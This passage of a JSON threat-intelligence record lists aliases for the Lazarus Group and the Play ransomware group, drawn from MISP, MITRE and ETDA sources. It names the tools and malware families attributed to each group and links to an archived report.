                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716500,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1488293737,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/9072321a018c8810d71002113c3b3f4a0873e676.pdf",
        "text": "https://archive.orkl.eu/9072321a018c8810d71002113c3b3f4a0873e676.txt",
        "img": "https://archive.orkl.eu/9072321a018c8810d71002113c3b3f4a0873e676.jpg"
    }
}